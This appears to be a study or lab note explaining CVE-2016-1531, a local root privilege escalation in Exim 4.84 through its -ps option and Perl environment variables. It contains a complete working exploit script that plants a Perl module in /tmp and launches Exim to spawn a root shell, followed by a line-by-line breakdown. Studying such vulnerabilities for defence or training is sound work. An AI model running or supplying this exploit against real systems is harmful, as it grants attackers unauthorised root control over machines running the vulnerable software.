# If exim 4.84 is being used you can take advantage of CVE-2016-1531

# Exploit breakdown
This exploit works by taking advantage of how the -ps command behaves in exim 4.84
In this version of exim, the -ps option causes exim to invoke its embedded perl interpreter,
or in other words the computer would now read and run any perl language that was part of
the command it was being given, as well it would do so in a root environment, before dropping
root privileges.
This meant that perl environment variables, such as PERL5LIB and PERL5OPT, could now be
passed data that would be allowed to execute, using the -ps option with exim.
This allows for module injection, where you can:
- Set the PERL5LIB env variable to check in a directory of your choice (PERL5LIB=/tmp)
- Set the PERL5OPT env variable to load a module of your choice
- Use Exim's -ps option to run Perl code as root, which makes the entire attack possible

Combining these two env variables and Exim's -ps option, you can attain arbitrary code 
execution, which can allow you to gain a root shell with a simple script, 
containing something like system("bin/sh")

## Script that takes advantage of this exploit ##

#!/bin/sh
cat > /tmp/root.pm << EOF
package root;
use strict;
use warnings;

system("/bin/sh");
EOF
PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps

## Breakdown of script above ##
# First line
Creates a file named root.pm, located in the /tmp directory: (cat > /tmp/root.pm).
The << EOF syntax is saying that the content of root.pm will contain the following lines 
and to stop adding lines when EOF is parsed. EOF could be anything, it is simply a signal 
to stop adding lines to root.pm

# Next 6 lines
This is the script that will be added to the perl module root.pm, as well as the signal to 
stop adding lines to root.pm (EOF)
The content is a Perl script that spawns a root shell (system("/bin/sh"))

# Last line is a Linux command:
PERL5LIB=/tmp tells the perl interpreter to check the /tmp directory for modules, before
	everything else
PERL5OPT=-Mroot injects an invisible command line argument that tells the perl interpreter to 
	run the perl module /tmp/root.pm which is what is going to spawn the root shell
/usr/exim/bin/exim -ps will invoke a perl interpreter and run everything as root which will
	everything to run in the first place

When this command runs:

- Exim initializes embedded Perl while still privileged
- Your module is found and loaded from /tmp
- The system("/bin/sh") line runs immediately
- A root shell is spawned
